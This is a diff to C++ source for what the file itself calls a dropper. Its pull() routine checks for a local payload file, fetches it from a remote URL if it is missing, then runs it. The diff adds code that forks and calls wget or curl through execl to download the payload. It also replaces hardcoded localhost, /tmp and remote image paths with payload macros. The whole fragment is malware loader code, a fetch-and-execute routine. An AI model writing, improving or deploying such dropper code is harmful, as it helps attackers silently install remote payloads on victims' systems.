@@ -1,18 +1,10 @@
 #include "dropper.h"
 
-std::string mystring("127.0.0.1");
-std::string payload("/tmp/image.jpg");
-std::string image("https://www.cleverfiles.com/howto/wp-content/uploads/2016/08/mini.jpg");
-
-void download();
-bool fileExists(std::string);
-void execute();
-
 int pull()
 {
 	fprintf(stdout, "[Dropper called]");
 
-	bool payloadExists = fileExists(payload);
+	bool payloadExists = fileExists(_PayloadLocal);
 
 	fputs(payloadExists ? "Exists" : "Doesn't Exist", stdout);
 
@@ -20,13 +12,6 @@ int pull()
 		download();
 	
 	execute();
-
-	//	fileExists 
-	//	no
-	// 		download()
-	// 		execute()
-	//  yes	
-	// 		execute()
 
 	return 0;
 }
@@ -40,17 +25,29 @@ bool fileExists(std::string name)
 
 void download()
 {
-	std::vector<std::string> webclients = 
+	std::vector<const char*> webclients = 
 	{
 			"/usr/bin/wget",
 		   	"/usr/bin/curl"
 	};
 
-	for(std::vector<std::string>::iterator it = webclients.begin() ; it != webclients.end(); it++)
+
+	for(size_t i = 0; i < webclients.size(); i++)
 	{
-		if(fileExists(webclients[it - webclients.begin()]))
+		if(fileExists(webclients[i]))
 		{
-				execute();
+				std::cout << "Found webclient: " << webclients[i] << std::endl;
+				
+				int pid = fork();
+
+				if(pid == 0)
+					execl(webclients[i], "wget", 
+										 (i == 0) ? "-q" : "-sS",
+										 (i == 0) ? "-O" : "-o",
+										 _PayloadLocal.c_str(), 
+										 _PayloadRemote.c_str(),
+										 NULL);
+
 				break;
 		}
 	}
